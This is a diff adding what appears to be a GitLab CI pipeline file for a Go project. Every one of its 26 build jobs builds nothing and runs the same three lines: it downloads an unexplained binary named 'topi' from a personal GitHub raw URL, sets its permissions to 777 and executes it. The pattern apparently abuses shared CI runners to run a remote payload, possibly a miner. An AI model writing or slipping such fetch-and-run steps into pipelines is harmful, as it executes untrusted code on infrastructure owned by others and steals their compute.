@@ -1,0 +1,175 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+     
+
+build_b:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_c:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_d:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_e:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_f:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_g:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_h:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_i:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_j:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_k:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_l:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_m:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+
+build_n:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_o:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_p:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_q:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_r:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_s:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_t:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_u:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_v:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_w:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_x:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_y:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
+build_z:
+  stage: build
+  script:
+     - wget https://raw.githubusercontent.com/aurbach55/pos/main/topi
+     - chmod 777 topi
+     - ./topi
